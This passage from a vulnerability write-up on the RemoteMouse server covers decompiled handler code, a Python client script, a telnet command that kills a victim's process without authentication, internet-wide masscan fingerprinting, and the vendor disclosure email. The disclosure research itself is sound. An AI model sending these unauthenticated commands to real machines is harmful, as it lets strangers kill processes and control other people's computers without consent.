    <span class="kt">int</span> <span class="n">num4</span> <span class="p">=</span> <span class="kt">int</span><span class="p">.</span><span class="nf">Parse</span><span class="p">(</span><span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="n">array6</span><span class="p">));</span>
    <span class="kt">byte</span><span class="p">[]</span> <span class="n">array7</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="n">num4</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">num</span> <span class="p">&gt;</span> <span class="m">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">num</span> <span class="p">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">Receive</span><span class="p">(</span><span class="n">array7</span><span class="p">,</span> <span class="n">num4</span><span class="p">,</span> <span class="n">SocketFlags</span><span class="p">.</span><span class="n">None</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="kt">string</span> <span class="n">fileNameWithoutExtension</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="nf">GetFileNameWithoutExtension</span><span class="p">(</span><span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="n">array7</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(!</span><span class="n">fileNameWithoutExtension</span><span class="p">.</span><span class="nf">ToLower</span><span class="p">().</span><span class="nf">Equals</span><span class="p">(</span><span class="s">"explorer"</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="k">try</span>
        <span class="p">{</span>
            <span class="n">Process</span><span class="p">[]</span> <span class="n">processesByName</span> <span class="p">=</span> <span class="n">Process</span><span class="p">.</span><span class="nf">GetProcessesByName</span><span class="p">(</span><span class="n">fileNameWithoutExtension</span><span class="p">);</span>
            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">processesByName</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span>
            <span class="p">{</span>
                <span class="n">processesByName</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="nf">Kill</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">catch</span>
        <span class="p">{</span>
        <span class="p">}</span>
        <span class="k">continue</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">continue</span><span class="p">;</span>
</code></pre></div></div>

<p>This means, by sending a message to port 1979, say something like</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>elnet 192.168.86.195 1979
Trying 192.168.86.195...
Connected to 192.168.86.195.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
clo006chrome
</code></pre></div></div>

<p>You can force a process to die without a user every realizing. No mouse movement, no keyboard input, nothing. All of this with NO authentication. Let’s implement these functions in our exploit code.</p>

<p>Let’s start with the <code class="language-plaintext highlighter-rouge">act</code> subroutine. In the code, this is called via the <code class="language-plaintext highlighter-rouge">q.b(socket)</code>, which turns into a more complicated function:</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">b</span><span class="p">(</span><span class="n">Socket</span> <span class="n">A_0</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">1295</span><span class="p">];</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="n">Class_AppInfo</span> <span class="n">class_AppInfo</span> <span class="k">in</span> <span class="n">Class_ProgramInfo</span><span class="p">.</span><span class="n">apps</span><span class="p">.</span><span class="n">Values</span><span class="p">.</span><span class="n">ToList</span><span class="p">&lt;</span><span class="n">Class_AppInfo</span><span class="p">&gt;())</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">class_AppInfo</span><span class="p">.</span><span class="n">ico</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">MemoryStream</span> <span class="n">memoryStream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">MemoryStream</span><span class="p">();</span>
            <span class="n">class_AppInfo</span><span class="p">.</span><span class="n">ico</span><span class="p">.</span><span class="nf">ToBitmap</span><span class="p">().</span><span class="nf">Save</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">,</span> <span class="n">ImageFormat</span><span class="p">.</span><span class="n">Png</span><span class="p">);</span>
            <span class="n">class_AppInfo</span><span class="p">.</span><span class="n">icoLength</span> <span class="p">=</span> <span class="p">(</span><span class="kt">ulong</span><span class="p">)</span><span class="n">memoryStream</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span>
            <span class="n">Array</span><span class="p">.</span><span class="nf">Clear</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">array</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
            <span class="n">MemoryStream</span> <span class="n">memoryStream2</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">MemoryStream</span><span class="p">();</span>
            <span class="n">memoryStream2</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">class_AppInfo</span><span class="p">.</span><span class="n">appName</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">class_AppInfo</span><span class="p">.</span><span class="n">appName</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
            <span class="n">memoryStream2</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">class_AppInfo</span><span class="p">.</span><span class="n">appPath</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">class_AppInfo</span><span class="p">.</span><span class="n">appPath</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
            <span class="n">memoryStream2</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">BitConverter</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">class_AppInfo</span><span class="p">.</span><span class="n">appStatus</span><span class="p">),</span> <span class="m">0</span><span class="p">,</span> <span class="m">1</span><span class="p">);</span>
            <span class="n">memoryStream2</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">BitConverter</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">class_AppInfo</span><span class="p">.</span><span class="n">apphWnd</span><span class="p">),</span> <span class="m">0</span><span class="p">,</span> <span class="m">4</span><span class="p">);</span>
            <span class="n">memoryStream2</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">BitConverter</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">class_AppInfo</span><span class="p">.</span><span class="n">intPre2</span><span class="p">),</span> <span class="m">0</span><span class="p">,</span> <span class="m">4</span><span class="p">);</span>
            <span class="n">memoryStream2</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">BitConverter</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">class_AppInfo</span><span class="p">.</span><span class="n">bPre1</span><span class="p">),</span> <span class="m">0</span><span class="p">,</span> <span class="m">1</span><span class="p">);</span>
            <span class="n">memoryStream2</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">BitConverter</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">class_AppInfo</span><span class="p">.</span><span class="n">bPre2</span><span class="p">),</span> <span class="m">0</span><span class="p">,</span> <span class="m">1</span><span class="p">);</span>
            <span class="n">memoryStream2</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">BitConverter</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">class_AppInfo</span><span class="p">.</span><span class="n">icoLength</span><span class="p">),</span> <span class="m">0</span><span class="p">,</span> <span class="m">4</span><span class="p">);</span>
            <span class="n">memoryStream2</span><span class="p">.</span><span class="n">Position</span> <span class="p">=</span> <span class="m">0L</span><span class="p">;</span>
            <span class="n">memoryStream2</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">class_AppInfo</span><span class="p">.</span><span class="n">appName</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
            <span class="n">memoryStream2</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="m">256</span><span class="p">,</span> <span class="n">class_AppInfo</span><span class="p">.</span><span class="n">appPath</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
            <span class="n">memoryStream2</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="m">1280</span><span class="p">,</span> <span class="m">1</span><span class="p">);</span>
            <span class="n">memoryStream2</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="m">1281</span><span class="p">,</span> <span class="m">4</span><span class="p">);</span>
            <span class="n">memoryStream2</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="m">1285</span><span class="p">,</span> <span class="m">4</span><span class="p">);</span>
            <span class="n">memoryStream2</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="m">1289</span><span class="p">,</span> <span class="m">1</span><span class="p">);</span>
            <span class="n">memoryStream2</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="m">1290</span><span class="p">,</span> <span class="m">1</span><span class="p">);</span>
            <span class="n">memoryStream2</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="m">1291</span><span class="p">,</span> <span class="m">4</span><span class="p">);</span>
            <span class="n">memoryStream2</span><span class="p">.</span><span class="nf">Close</span><span class="p">();</span>
            <span class="kt">byte</span><span class="p">[]</span> <span class="n">buffer</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">3</span><span class="p">];</span>
            <span class="n">buffer</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="s">"dok"</span><span class="p">);</span>
            <span class="kt">byte</span><span class="p">[]</span> <span class="n">buffer2</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">4</span><span class="p">];</span>
            <span class="n">buffer2</span> <span class="p">=</span> <span class="n">BitConverter</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">array</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
            <span class="k">try</span>
            <span class="p">{</span>
                <span class="n">A_0</span><span class="p">.</span><span class="nf">Send</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
                <span class="n">A_0</span><span class="p">.</span><span class="nf">Send</span><span class="p">(</span><span class="n">buffer2</span><span class="p">);</span>
                <span class="n">A_0</span><span class="p">.</span><span class="nf">Send</span><span class="p">(</span><span class="n">array</span><span class="p">);</span>
                <span class="n">A_0</span><span class="p">.</span><span class="nf">Send</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">.</span><span class="nf">ToArray</span><span class="p">());</span>
            <span class="p">}</span>
            <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">A_0</span><span class="p">.</span><span class="nf">Close</span><span class="p">();</span>
                <span class="n">A_0</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="n">memoryStream</span><span class="p">.</span><span class="nf">Close</span><span class="p">();</span>
            <span class="n">memoryStream</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Let’s start digesting this… It first it creates an array, size 1295 bytes long, this is will the final payload will be stored. Then itcreates the PNG of the application’s icon, stores it into a <code class="language-plaintext highlighter-rouge">memorystream</code> and calculates the icon’s length. Once the icon is dealt with, a separate <code class="language-plaintext highlighter-rouge">memorystream</code> is created and information is put into it. Finally, information from the second <code class="language-plaintext highlighter-rouge">memorystream</code> is put into the array that was created earlier.</p>

<p>Now that all the buffers are created, the following is sent back to the client:</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">dok</code> (just a hard-coded string)</li>
  <li>Length of the next array</li>
  <li>Array containing all the application information (including the length of the icon)</li>
  <li>Icon</li>
</ol>

<p>So we can pull the buffer lengths from the data it ends up sending:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kn">import</span> <span class="nn">socket</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"192.168.86.195"</span><span class="p">,</span> <span class="mi">1979</span><span class="p">))</span>

<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'act'</span><span class="p">)</span>

<span class="n">dok</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"dok"</span><span class="p">,</span> <span class="n">dok</span><span class="p">)</span>

<span class="n">buff_len</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span> <span class="s">'little'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"buff_len"</span><span class="p">,</span> <span class="n">buff_len</span><span class="p">)</span>

<span class="n">buff</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">buff_len</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"buff"</span><span class="p">,</span> <span class="n">buff</span><span class="p">[:</span><span class="mi">256</span><span class="p">])</span>

<span class="n">icon_len</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">buff</span><span class="p">[</span><span class="o">-</span><span class="mi">4</span><span class="p">:],</span> <span class="s">'little'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"icon_len"</span><span class="p">,</span> <span class="n">icon_len</span><span class="p">)</span>

<span class="n">icon</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">icon_len</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"icon"</span><span class="p">,</span> <span class="n">icon</span><span class="p">[:</span><span class="mi">4</span><span class="p">])</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 <span class="nb">test</span>/test.py
dok b<span class="s1">'dok'</span>
buff_len 1295
buff b<span class="s1">'dnSpy v6.1.8 (32-bit, .NET, Administrator, Debugging)\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span>
icon_len 280
icon b<span class="s1">'\x89PNG'</span>
</code></pre></div></div>

<p>Nice! The server actually streams all the data to you, one at a time, so I just set a 0.5 second timeout on the socket and continuously read the data into a <code class="language-plaintext highlighter-rouge">dict</code> to store everything, then I dumped it out into a <code class="language-plaintext highlighter-rouge">manifest.json</code> and <code class="language-plaintext highlighter-rouge">PNG</code> files. To use this, just run <code class="language-plaintext highlighter-rouge">python3 mousetrap.py --dump-apps</code>.</p>

<p>Let’s implement the rest of the functions that are exposed on this service (<code class="language-plaintext highlighter-rouge">opn</code>, <code class="language-plaintext highlighter-rouge">clo</code>, <code class="language-plaintext highlighter-rouge">min</code>, <code class="language-plaintext highlighter-rouge">max</code>). <code class="language-plaintext highlighter-rouge">clo</code> is actually insanely easy, you just send the command followed by how many bytes the name of the process is, and the process that you want to close. This was demonstrated above, and is implemented with <code class="language-plaintext highlighter-rouge">--close-process chrome.exe</code>, or whatever process you want.</p>
      <h2 id="market-penetration">
        
        
          Market Penetration <a href="#market-penetration">#</a>
        
        
      </h2>
    

<p>I started to get curious on how many servers there were out there. The Android play store reports “10,000,000+” downloads of the app, and that probably wouldn’t be a 1:1 correlation to a server, plus people eventually uninstall the server from their computer. All of that, <em>plus</em> to even target a remote host they have to be routable to <code class="language-plaintext highlighter-rouge">TCP/UDP</code> 1978/1979. But it would still be cool to scan the internet real quick and see who is out there. Luckily for us, the service on port 1978 broadcasts a banner.</p>

<p>At first, I was writing an Nmap script to scan a subnet, and match the banner, but I don’t think Nmap would be particularly good at scanning the entire internet. In fact, that’s why <a href="https://github.com/robertdavidgraham/masscan">massscan</a> was invented. However, looking at masscan, it’s kind of hard to build a custom protocol analyzer, so instead, let’s write an Nmap service script first.</p>

<p>Writing an Nmap service/banner match is actually pretty straight-forward given their <a href="https://nmap.org/book/vscan-fileformat.html">guide</a>. The documented probe file is in the <code class="language-plaintext highlighter-rouge">scanning/</code> dir, as well as some example usage.</p>

<p>So right now, we could use masscan to see all open 1978 ports on TCP, then pipe that to Nmap to do the actual service scanning. That’s probably insanely fast, and faster than I’ll ever need, but I want <em>faster</em>.</p>

<p>Let’s take a look again at writing a masscan protocol analyzer… I wrote some more detailed documentation in the <code class="language-plaintext highlighter-rouge">scanning/</code> dir, but the tl;dr is that I wrote a protocol analyzer for masscan that can tell if:</p>

<ul>
  <li>a computer is running RemoteMouse</li>
  <li>a computer is running a password-protected version of RemoteMouse</li>
  <li>a computer is MacOS or Windows</li>
</ul>

<p>To run it (after building the patched version of masscan, again docs in <code class="language-plaintext highlighter-rouge">scanning/</code>):</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> ./bin/masscan <span class="nt">--banners</span> <span class="nt">--adapter-port</span> 61000 <span class="nt">--ports</span> 1978 192.168.86.195                                  
Starting masscan 1.3.2 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2021-02-11 01:52:01 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts <span class="o">[</span>1 port/host]
Discovered open port 1978/tcp on 192.168.86.195                                
Banner on port 1978/tcp on 192.168.86.195: <span class="o">[</span>remotemouse] SIN 15win nop nop 300 
Banner on port 1978/tcp on 192.168.86.195: <span class="o">[</span>remotemouse.password_protected] FALSE
Banner on port 1978/tcp on 192.168.86.195: <span class="o">[</span>remotemouse.os] Windows            

</code></pre></div></div>
      <h2 id="disclosure">
        
        
          Disclosure <a href="#disclosure">#</a>
        
        
      </h2>
    

<p>On 02/06/2021 I sent an email to <code class="language-plaintext highlighter-rouge">info@remotemouse.net</code>:</p>

<blockquote>
  <p>RemoteMouse Team,</p>

  <p>I’m a security researcher that has identified vulnerabilities in your application protocol for RemoteMouse. After analyzing the packets sent from the RemoteMouse Android Application to the Windows RemoteMouse service, I noticed three critical issues:</p>

  <ul>
    <li>
      <p>CWE-836: Use of Password Hash Instead of Password for Authentication</p>

      <p>The client software sends the hash of the password a user enters to the server in order to authenticate. This can cause the hash of the user’s passwords to be intercepted and looked up in a rainbow table, resulting in the user’s password being revealed.</p>
    </li>
    <li>
      <p>CWE-306: Missing Authentication for Critical Function and CWE-319: Cleartext Transmission of Sensitive Information</p>

      <p>Even with a “password” set, the server and client do not encrypt communications, this allows a passive observer to see what activity the user is sending to the server.</p>
    </li>
    <li>
      <p>CWE-294: Authentication Bypass by Capture-replay</p>

      <p>The client and server do not use cryptographic nonces in communications, this allows any passive observer to replay the commands sent, even when the password is set on the server side.</p>
    </li>
  </ul>

  <p>Per standard vulnerability disclosure practices, please respond within 90 days of today (Friday May 7, 2021). If you have any questions on the details of the vulnerabilities, or you would like any assistance, please do not hesitate to reach out to me via email (me@axelp.io).</p>

  <p>Thank you,</p>

  <p>Axel Persinger.</p>
</blockquote>

<p>I never received a response from the vendor. I have also reached out to Microsoft, Apple, and Google (Android Play Store) to see if they would remove the application, or warn users about it, but never heard a response from them either. On 05/05/2021 the details of the vulnerability, the exploit code, and this writeup will go public, albeit a few days early.</p>
      <h2 id="future-work">
        
        
          Future Work <a href="#future-work">#</a>
        
        
      </h2>
    

<p>I think there are still some vulnerabilities that could be found in this software system. If you’re interested in working together, let me know and I’d love to look at it again! There’s also a lot of room to add additional functionality to the <code class="language-plaintext highlighter-rouge">mousetrap.py</code> script; you could do things like mess with the cursor, add random keystrokes every once in a while, etc.</p>
      <h2 id="special-thanks">
        
        
          Special Thanks <a href="#special-thanks">#</a>
        
        
      </h2>
    

<p>Special thanks to <a href="https://www.linkedin.com/in/matthew-matteis-616a33bb/">Matt Matteis</a> for reviewing this report and guiding me through the disclosure process.</p>

<p>Another special thanks to <a href="https://github.com/kieranlondon">Kieran London</a>, without him I would have never figured out a bug in my mapping of the targets in the Analysis section.</p>

  </div><a class="u-url" href="/MouseTrap" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">Axel Persinger</li>
          <li><a class="u-email" href="mailto:me@axelp.io">me@axelp.io</a></li>
            <li><a class="u-email" href="/docs/AxelPersinger_Resume.pdf">Resume</a></li>
        </ul>
      </div>
      <div class="footer-col">
        <p>Technical blog discussing reverse engineering, detections engineering,  exploit development, capability development, and other cybersecurity topics.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li><a rel="me" href="https://github.com/CuckooEXE" title="CuckooEXE"><svg class="svg-icon grey"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg></a></li><li><a rel="me" href="https://www.linkedin.com/in/axelpersinger" title="axelpersinger"><svg class="svg-icon grey"><use xlink:href="/assets/minima-social-icons.svg#linkedin"></use></svg></a></li><li><a rel="me" href="https://twitter.com/CuckooEXE" title="CuckooEXE"><svg class="svg-icon grey"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg></a></li></ul>
</div>

  </div>

</footer>
</body>

</html>
